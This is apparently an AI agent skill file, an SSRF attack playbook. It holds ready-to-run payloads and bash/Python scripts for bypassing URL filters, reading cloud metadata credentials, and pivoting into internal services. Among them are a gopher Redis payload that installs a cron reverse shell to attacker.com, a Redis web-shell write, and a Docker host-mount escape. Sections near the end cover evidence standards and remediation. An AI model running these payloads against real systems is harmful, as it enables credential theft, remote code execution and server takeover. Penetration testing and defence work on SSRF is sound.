---
name: ssrf-server-side-request-forgery
description: >-
  SSRF playbook. Use when the server fetches URLs, resolves hostnames, imports remote content, or can be driven toward internal networks, cloud metadata, or secondary protocols.
---

# SKILL: Server-Side Request Forgery (SSRF) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSRF techniques. Covers URL filter bypass, cloud metadata endpoints, protocol exploitation, blind SSRF detection, and chaining to RCE. Base models know basic 169.254.169.254 — this file covers what they miss. For real-world CVE chains, DNS Rebinding deep dives, K8s SSRF, and SSRF → Redis → RCE full exploitation, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. QUICK START

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- WebLogic SSRF (CVE-2014-4210) — `uddiexplorer/SearchPublicRegistries.jsp` + `operator` parameter + `%0D%0A` CRLF to inject Redis commands
- SSRF → internal Redis → write crontab reverse shell complete payload chain
- DNS Rebinding deep dive — TTL=0 trick, initial-legit→second-internal resolution, `rbndr.us` service
- Kubernetes SSRF (CVE-2020-8555) and bypass (CVE-2020-8562) via DNS rebinding
- SSRF through PDF/screenshot generators — `<iframe>` and `<img>` in HTML-to-PDF
- Gopher protocol full TCP injection — Redis, MySQL, FastCGI payloads via Gopherus
- URL parser confusion for filter bypass — `#@`, `\@`, `%00@`, IPv6-mapped IPv4

### Advanced Reference

Also load [URL_PARSER_TRICKS.md](./URL_PARSER_TRICKS.md) when you need:
- URL parser differential table: Python urllib vs requests vs Java URL vs PHP parse_url vs Node url.parse vs Go net/url
- Full cloud metadata endpoint catalog (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba Cloud, Oracle Cloud, Kubernetes, Hetzner, OpenStack)
- gopher:// payload recipes for Redis, MySQL, SMTP, FastCGI, Memcached (with encoding rules)
- DNS Rebinding detailed attack flow with TTL manipulation and TOCTOU analysis
- PDF/wkhtmltopdf/WeasyPrint/Chrome headless/PhantomJS SSRF patterns and exfiltration techniques

If you just found a parameter that fetches a URL, perform first-pass confirmation here directly.

### First-pass payloads

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
```

### Host validation bypass families

| Validation Type | Try |
|---|---|
| blocks `localhost` string | `127.0.0.1`, `127.1`, `[::1]` |
| blocks direct IP only | internal DNS name, decimal/octal/hex IP forms |
| allowlist by prefix | username part, subdomain confusion, redirect chain |
| follows redirects | benign external URL redirecting to internal target |
| parses once, fetches twice | mixed encoding or DNS rebinding style targets |

### Protocol routing

| Goal | Protocol / Target |
|---|---|
| cloud credentials | metadata HTTP endpoints |
| internal HTTP admin | `http://127.0.0.1:port/` |
| Redis / raw TCP style abuse | `gopher://` |
| local file read candidate | `file://` |
| dictionary / banner tests | `dict://` |

---

## 1. FINDING SSRF SURFACE

Look for **any parameter containing DNS names, IP addresses, or URLs**:

```
loc=           url=        path=         endpoint=
imageUrl=      dest=       redirect=     uri=
callback=      load=       file=         resource=
link=          src=        data=         ref=
```

**Less obvious SSRF vectors**:
- PDF/screenshot generation (URL to capture)
- Webhook configuration fields
- Import/export via URL (CSV import, RSS/Atom feeds)
- OAuth redirect URI (sometimes triggers server-side fetch)
- `X-Forwarded-Host` / `X-Real-IP` headers in proxy chains
- XML `DOCTYPE` with external entity (`file://`, `http://`)
- GraphQL `@link` directive (federation)
- Content-Type: `text/html` pages parsed for `<link>` preload headers

---

## 2. BASIC CONFIRMATION METHODOLOGY

```
Step 1: Supply your Burp Collaborator / interact.sh URL
        → Check server initiates outbound connection (full SSRF confirmed)

Step 2: If no callback → test time-based (open port = fast, closed = slow/reset):
        Compare response time for:
        http://192.168.1.1:22   (likely open → fast)
        http://192.168.1.1:9999 (likely closed → slow/timeout)

Step 3: Try accessing localhost services:
        http://127.0.0.1:8080
        http://127.0.0.1:22
        http://127.0.0.1:6379  (Redis)
        http://127.0.0.1:9200  (Elasticsearch)
        http://127.0.0.1:5984  (CouchDB)
        http://127.0.0.1:2375  (Docker daemon — critical!)
        http://127.0.0.1:4840  (internal admin)
```

---

## 3. CLOUD METADATA ENDPOINTS — MUST-TRY

### AWS EC2 IMDSv1 (no auth required — critical)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

### AWS IMDSv2 (token required — but check if SSRF can GET the token)
```
Step 1: PUT http://169.254.169.254/latest/api/token
        Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
Step 2: GET http://169.254.169.254/latest/meta-data/
        Header: X-aws-ec2-metadata-token: TOKEN
```
**If SSRF supports custom headers → full IMDSv2 bypass**.

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Headers: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Headers: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Kubernetes Service Account
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
http://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## 4. IP ADDRESS FILTER BYPASS TECHNIQUES

When `169.254.169.254`, `127.0.0.1`, `localhost` are blocked:

### Localhost Variants
```
127.0.0.1
127.1
127.0.1
127.000.000.001    ← octal padding
0x7f000001         ← hex
2130706433         ← decimal (0x7f000001)
0177.0000.0000.0001  ← octal
[::]               ← IPv6 loopback
[::1]              ← IPv6 loopback
[::ffff:127.0.0.1] ← IPv4-mapped IPv6
```

### 169.254.169.254 Variants
```
169.254.169.254
2852039166               ← decimal
0xa9fea9fe               ← hex
0251.0376.0251.0376      ← octal
[::ffff:169.254.169.254] ← IPv6
169.254.169.254.nip.io   ← DNS rebinding service
```

### Private Network Ranges
```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
fc00::/7  ← IPv6 private
```

### Bypass Filter via DNS Input
If filter checks DNS-resolved IP (not hostname):
```
http://attacker.com/  ← DNS A record points to 169.254.169.254
```
Use DNS rebinding: initial lookup returns valid IP → passes filter → second request returns internal IP.

---

## 5. URL SCHEME ATTACKS

When `http://` is allowed or weakly filtered:

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/arp   ← reveals internal network ARP table
file:///proc/net/tcp   ← open network connections

dict://127.0.0.1:6379/INFO   ← Redis INFO command via dict://

gopher://127.0.0.1:6379/_INFO%0d%0a   ← Redis via gopher
gopher://127.0.0.1:9200/   ← Elasticsearch

sftp://attacker.com:11111/   ← triggers SFTP connection (credential hash)
ldap://attacker.com:389/     ← triggers LDAP bind
ftp://attacker.com/          ← triggers FTP connection
```

### Redis Gopher SSRF (full RCE potential)
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

---

## 6. BLIND SSRF DETECTION

When response doesn't reflect fetched content:

1. **Burp Collaborator / interact.sh**: check for DNS + HTTP request from server
2. **Pingback/webhook abuse**: configure application's own webhook to your URL
3. **Timing analysis**: Internal open port vs closed port response time difference
4. **Error analysis**: Different error messages for "host not found" vs "connection refused" vs "timeout" reveal internal network topology

---

## 7. INTERNAL SERVICE EXPLOITATION

### Docker API (2375 unauthenticated)
```
http://127.0.0.1:2375/v1.24/containers/json      ← list containers
http://127.0.0.1:2375/v1.24/images/json          ← list images
# Create privileged container → escape to host:
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
```

### Elasticsearch (9200 no-auth default)
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/.kibana/_search
http://127.0.0.1:9200/INDEX_NAME/_search?q=*
```

### Redis (6379 — no-auth common)
```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
dict://127.0.0.1:6379/BGSAVE
```

### Internal Admin Panels
```
http://127.0.0.1:8080/admin
http://127.0.0.1:8443/admin
http://127.0.0.1:9000/actuator   ← Spring Boot actuator (exposed endpoints)
http://127.0.0.1:9000/actuator/env
http://127.0.0.1:9000/actuator/heapdump
```

---

## 8. SSRF + FILTER BYPASS DECISION TREE

```
SSRF parameter found?
├── Try http://169.254.169.254/ directly → blocked?
│   ├── Try decimal/hex/octal variants
│   ├── Try IPv6 variants [::ffff:169.254.169.254]
│   ├── Try DNS rebinding (nip.io, custom NS)
│   └── Try redirect: attacker.com → 169.254.169.254 (302)
│
├── Try http://127.0.0.1/ → blocked?
│   ├── Try 127.1 / 127.0.1 / 0x7f000001 / 2130706433
│   ├── Try localhost → might not be blocked
│   └── Try IPv6 [::1]
│
├── What protocols are allowed?
│   ├── dict:// → test Redis, Memcached
│   ├── gopher:// → full TCP data injection (target Redis/SMTP)
│   ├── file:// → local file read
│   └── sftp:// ldap:// ftp:// → network interactions
│
└── Blind SSRF → use Burp Collaborator
    └── DNS-only → use DNS rebinding or SSRF with OOB DNS
```

---

## 9. THE SSRF-FILTER MINDSET

From zseano's methodology: **if developers filter only `169.254.169.254` directly but not `http://169.254.169.254/latest/meta-data`** (full path), or forget about:
- IPv6 equivalents  
- DNS names that resolve to internal IPs
- Redirect chains (server follows 302 to internal IP)

**Classic gap**: App filters `127.0.0.1` but not `127.1` or `[::1]` or `localhost`.

**Application-layer SSRF via XML** (when app parses XML):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```

---

## 10. EXECUTION PRIMITIVES

SSRF is proven by **receiving a request you caused the server to make**. Every block below produces a
callback, a differential, or a returned internal response - never an inference.

### 10.1 Establish the callback baseline

```bash
# a collector that logs the request line, the source address, and the headers
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime
class H(BaseHTTPRequestHandler):
    def _log(self):
        with open("ssrf.log","a") as f:
            f.write(f"{datetime.datetime.utcnow().isoformat()} {self.command} {self.path} from {self.client_address[0]}\n")
            for k,v in self.headers.items(): f.write(f"    {k}: {v}\n")
    def do_GET(self):  self._log(); self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        self._log()
        with open("ssrf.log","a") as f: f.write(f"    BODY {body[:500]!r}\n")
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self,*a): pass
HTTPServer(("0.0.0.0",80), H).serve_forever()
PY
# then the parameter you are testing
curl -sS "https://target.tld/api/fetch?url=http://YOUR_IP/ssrf-probe-1" | head -c 200
sleep 3; grep -c 'ssrf-probe-1' ssrf.log
```

**Count the callbacks, not the responses.** A parameter that returns a plausible page may have fetched
nothing; the log line is the fact.

### 10.2 Scheme sweep

```bash
for U in \
  "http://YOUR_IP/p-http" \
  "https://YOUR_IP/p-https" \
  "gopher://YOUR_IP:80/_GET%20/p-gopher" \
  "dict://YOUR_IP:11211/stat" \
  "ftp://YOUR_IP/p-ftp" \
  "file:///etc/passwd" \
  "file:///c:/windows/win.ini" \
  "sftp://YOUR_IP/p-sftp" \
  "ldap://YOUR_IP/p-ldap" \
  "tftp://YOUR_IP/p-tftp" ; do
  C=$(curl -sS -o /tmp/s -w '%{http_code}' --get --data-urlencode "url=$U" "https://target.tld/api/fetch")
  printf '%-42s %s  %s\n' "$U" "$C" "$(head -c 70 /tmp/s | tr -d '\n')"
done
```

`file://` returning content is a **local file read**, which is a stronger finding than a callback.
`gopher://` is the classic pivot into Redis/memcached/FastCGI - it is worth testing on any endpoint
that accepts a scheme. Record which schemes the app accepts; that list is the finding's shape.

### 10.3 Cloud metadata, per provider, with the required header

```bash
T="http://169.254.169.254"
declare -A M=(
 [aws-iam]="$T/latest/meta-data/iam/security-credentials/"
 [aws-userdata]="$T/latest/user-data"
 [aws-identity]="$T/latest/dynamic/instance-identity/document"
 [gcp-token]="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 [gcp-identity]="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=x"
 [azure-token]="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
 [do-metadata]="http://169.254.169.254/metadata/v1.json"
 [oci-metadata]="http://169.254.169.254/opc/v2/instance/"
)
for K in "${!M[@]}"; do
  echo "=== $K"
  curl -sS --get --data-urlencode "url=${M[$K]}" "https://target.tld/api/fetch" | head -c 200; echo
  # the required headers are sent SERVER-side, so record whether the target's fetch sends them
done
```

The metadata service requires headers on GCP (`Metadata-Flavor: Google`) and Azure
(`Metadata: true`). If the endpoint does not forward your headers, those two are unreachable from it -
**record that**, because it changes what you can claim. AWS IMDSv2 also requires a token, so a hit on
IMDSv1 is itself a finding about the instance configuration.

### 10.4 IP filter bypass matrix

```bash
# each of these must resolve to 127.0.0.1 or the metadata address; verify with your own resolver first
for H in 127.0.0.1 127.1 0177.0.0.1 0x7f000001 2130706433 127.0.0.1.nip.io \
         127.0.0.1.sslip.io localhost localhost.localdomain '[::1]' '[::ffff:127.0.0.1]' \
         169.254.169.254 169.254.169.254.nip.io metadata.google.internal \
         '127.0.0.1%00.example.com' '127.0.0.1#@example.com'; do
  C=$(curl -sS -o /tmp/b -w '%{http_code}' --get --data-urlencode "url=http://$H:80/p" "https://target.tld/api/fetch")
  printf '%-38s %s  %s\n' "$H" "$C" "$(head -c 60 /tmp/b | tr -d '\n')"
done
```

Decimal, octal, hex, IPv6-mapped, and DNS-rebinding forms defeat string-match filters. **Verify the
form actually resolves** to the address you intend (`dig +short`, `python3 -c 'import ipaddress…'`)
before blaming the target.

### 10.5 Redirect-based bypass

```bash
# a redirect you control defeats a filter applied only to the initial URL
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
        self.end_headers()
    def log_message(self,*a): pass
HTTPServer(("0.0.0.0",80), H).serve_forever()
PY
curl -sS --get --data-urlencode "url=http://YOUR_IP/redir" "https://target.tld/api/fetch" | head -c 300
```

If the target follows the redirect, the filter was applied to the wrong URL. Test a redirect to each
of: metadata, an internal hostname, and your own collector (the last confirms following in general).
**A filter that validates only the first hop is bypassable by any open redirect** - including the
target's own (cross-reference `open-redirect`).

### 10.6 Blind SSRF: timing, error shape, and DNS

```bash
# a closed port on your own host fails fast; a filtered one hangs - measure both
for P in 80 443 22 3306 6379 8080; do
  T=$(curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "url=http://YOUR_IP:$P/x" "https://target.tld/api/fetch")
  echo "port $P -> ${T}s"
done
# and DNS-only detection: a unique subdomain that only resolves for you
curl -sS --get --data-urlencode "url=http://uniq13.YOUR_DOMAIN/x" "https://target.tld/api/fetch" | head -c 120
echo "check your DNS logs for uniq13 - resolution proves the server tried"
```

DNS-based detection works even when the target's egress blocks HTTP entirely. **A resolver log line is
a callback.** Use a unique label per attempt so you can attribute each request.

### 10.7 Internal service interaction

```bash
# read a service via the SSRF once you know it is reachable
for T in \
  "http://127.0.0.1:6379/" "http://127.0.0.1:11211/" "http://127.0.0.1:9200/" \
  "http://127.0.0.1:8500/v1/agent/self" "http://127.0.0.1:8080/actuator/env" \
  "http://127.0.0.1:8080/actuator/health" "http://127.0.0.1:8000/healthz" ; do
  echo "=== $T"
  curl -sS --get --data-urlencode "url=$T" "https://target.tld/api/fetch" | head -c 150; echo
done
```

Internal admin interfaces, metrics endpoints, and service registries are usually unauthenticated
**because they are not reachable** - and the SSRF makes them reachable. That is the impact statement.

### 10.8 Determine whether responses are returned, blind, or semi-blind

```bash
# full: the body comes back
curl -sS --get --data-urlencode "url=http://YOUR_IP/full" "https://target.tld/api/fetch" | head -c 150
# semi-blind: only the status or the length differs
for U in "http://YOUR_IP/ok" "http://YOUR_IP/404" "http://YOUR_IP/slow"; do
  curl -sS -o /dev/null -w "$U -> %{http_code} %{size_download} %{time_total}\n" \
    --get --data-urlencode "url=$U" "https://target.tld/api/fetch"
done
# blind: nothing returns, so the collector is the only oracle
grep -c 'YOUR_IP' ssrf.log
```

The class determines what you can claim: a **blind** SSRF that reaches the metadata service is still
critical when the response can be smuggled out through a second channel, but only if you demonstrated
that channel. State the class explicitly.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did **your collector receive the request**, with the target's source address? | the entire evidence base; a response alone proves nothing |
| 2 | Is the response **returned** to you, or is this blind? | determines what you can claim and how you must exfiltrate |
| 3 | Did you reach an **internal resource** (metadata, admin service, file)? | impact, as opposed to a request to your own host |
| 4 | For metadata: did the response contain a **live credential**, and is it usable? | the strongest SSRF outcome; test validity carefully in scope |
| 5 | Which **scheme and address form** bypassed the filter? | the fix must cover what worked |
| 6 | Did a **redirect** defeat the filter, or was the filter absent entirely? | a filter bypass is a different finding from a missing filter |
| 7 | Is the request made by the **server**, not by your browser or a client-side fetch? | rules out a client-side implementation |

**The collector log is the finding.** An internal-address response returned to you, or a callback from
the server, confirms it; a plausible-looking body without an inbound request to something you control
does not.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **request you sent** (parameter, URL, headers) | the reproduction |
| The **collector log line** - timestamp, path, server source IP, and headers | proves the server initiated the connection, and shows which headers it forwards |
| The **internal response body** where returned, or the exfiltration channel where blind | the impact |
| The **scheme and address form used**, and that it defeats the filter | the fix target |
| For metadata: the **response** and an assessment of the credential's validity, handled in scope | the severity driver |
| The **class** (full, semi-blind, blind) with the measurement that established it | determines the claim's strength |
| The **redirect chain** where one was used, with your redirector visible in it | a one-hop filter is the mechanism |
| **Negative control** - a URL pointing at a port you know is closed behaves differently from an open one | shows the differential is real and not a generic error page |
| Confirmation that **no credential was used** against production systems beyond a validity check | scope discipline |
| The **server-side network position** inferred (e.g. it reached `127.0.0.1`, so it runs locally) | impact context |

Report the **callback and the resource**: "`GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
returned the role name and the endpoint then returned temporary credentials for that role; a control
request to `http://<my-collector>/ssrf-confirm` produced a log line from the application's egress
address 203.0.113.42 at 14:02:11Z, confirming the server made the request; the endpoint accepted the
literal IP, so no filter is present", never "the parameter is vulnerable to SSRF".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| No callback in the collector, only a plausible response body | the server may have fetched nothing |
| A response that is the target's own error page echoed back | not an internal fetch |
| A request made by your **browser** because the app fetched client-side | not SSRF |
| An address form that does not actually resolve to `127.0.0.1` | your resolver, not the target's |
| A private IP blocked by the filter, with no bypass | the control worked |
| Metadata returning an empty body because the header was not forwarded | unreachable, not exploitable |
| A DNS resolution you cannot attribute to the target (shared resolver) | use a unique label per attempt or it is unusable |
| A redirect you control that the target did not follow | no bypass |
| A timing difference within normal variance | measure an average, not one sample |
| Credentials returned that are expired or scoped to nothing | test validity before claiming impact |
| An internal port that returns a generic proxy error | no reachable service |
| SSRF into a service you then modified | that is an incident; you needed only to read |

**Attribute every callback.** A request in your log that you cannot tie to a specific target request is
not evidence.

---

## 13. REMEDIATION REFERENCE

1. **Allowlist outbound destinations, and deny by default** - an enumerated set of hosts and paths is the only control that holds; blocklists of private ranges are defeated by encoding, DNS rebinding, and redirects.
2. **Resolve the hostname server-side and validate the resolved IP, then connect to that IP** - this closes the DNS-rebinding gap between validation and connection, which is the flaw in nearly every custom filter.
3. **Disable redirect following, or re-validate every hop** - a single-hop check is defeated by any redirect the attacker controls, including an open redirect on your own site.
4. **Restrict schemes to `http` and `https`** - `gopher`, `dict`, `file`, `ftp`, and `ldap` convert an SSRF into a protocol-level attack or a local file read, and they are almost never needed.
5. **Require IMDSv2 on all cloud instances, with a hop limit of 1** - it removes the unauthenticated metadata path that makes SSRF critical, and it is a one-line instance configuration.
6. **Egress-filter the application's network so it cannot reach link-local or private ranges** - the network control is what remains effective when the application-level filter is bypassed, and it also caps the blast radius of a future bug.
7. **Do not return raw responses from server-side fetches** - return a parsed, sanitised projection so the endpoint cannot be used to read arbitrary internal content.
8. **Authenticate every internal service, including health and metrics endpoints** - the SSRF finding is often amplified by internal services that assume network position is authentication.
9. **Run untrusted fetch behaviour in a sandbox with no ambient network** - the fetcher should not hold credentials, reach the metadata service, or sit in the same trust zone as the databases.
10. **Strip and control headers forwarded on server-side requests** - never forward the caller's `Authorization`, `Cookie`, or metadata headers into an outbound request blindly, and never add metadata headers on the caller's behalf.
11. **Log and alert on outbound connections to link-local, loopback, and private ranges** - the detection signal is a server process connecting somewhere it never connects in normal operation.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [open-redirect](../open-redirect/SKILL.md) - the redirect that defeats a single-hop filter
- [upload-insecure-files](../upload-insecure-files/SKILL.md) - the processing pipeline that provides the same fetch
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the local read that `file://` reaches directly
- [cloud-assessment](../cloud-assessment/SKILL.md) - what to do with the credentials metadata returns
- [aws-postexploit](../aws-postexploit/SKILL.md) - the escalation path once a role credential is in hand
